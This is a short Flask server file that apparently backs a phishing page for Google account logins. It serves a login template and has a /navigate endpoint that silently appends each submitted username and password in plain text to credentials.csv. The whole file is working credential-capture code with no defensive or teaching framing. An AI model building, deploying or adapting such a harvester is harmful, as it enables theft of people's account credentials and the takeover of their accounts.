from flask import Flask,redirect, url_for, request, render_template, jsonify
import csv

app = Flask(__name__)

@app.route("/")
def start():
    return "hello i am logging into the google acct"

@app.route("/login", methods=["GET"])
def login():
    return render_template("index.html")

@app.route("/navigate", methods=["POST"])
def navigate():
    username = request.json.get("username")
    password = request.json.get("password")
    with open("credentials.csv", "a+") as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow([username,password])
    return jsonify({
        "status":"success"
    }),200
 
if __name__ == "__main__":
    app.run(debug=True, port= 5500, host='localhost')